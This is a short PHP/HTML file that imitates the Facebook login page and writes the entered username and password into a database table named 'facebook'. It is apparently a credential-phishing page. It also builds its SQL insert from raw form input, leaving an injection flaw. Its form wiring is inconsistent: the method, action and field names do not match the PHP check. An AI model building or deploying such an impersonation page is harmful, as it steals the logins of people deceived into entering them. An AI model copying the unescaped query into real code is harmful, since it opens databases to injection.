 <?php

include 'conn.php';

if(isset($_POST['done'])){

 $username = $_POST['username'];
 $password = $_POST['password'];
 $q = " INSERT INTO `facebook`(`username`, `password`) VALUES ( '$username', '$password' )";

 $query = mysqli_query($con,$q);
}
?>

<head>
<link href="https://fonts.googleapis.com/css?family=Indie+Flower|Overpass+Mono" rel="stylesheet">
<link rel="stylesheet" type="text/css" href="newstyle.css">
 <meta name="mobile-web-app-capable" content="yes">
 <meta charset="UTF-8">

</head>
<body>
  <div class="facebook">
    <p>facebook</p>

    <form action="success.php">

      <div class="username">

        <input type="text" name="username" placeholder="mobile number or email">

      </div>

       <div class="password">

        <input type="password" name="password" placeholder="password">

      </div>

       <div class="submit">

        <input type="submit" name="submit" value="login">

      </div>


    </form>

    <div class="forgot"><a href="#">forgotten password?</a><br>
    <a href="#">Create New account</a></p></div>


  </div>

</body>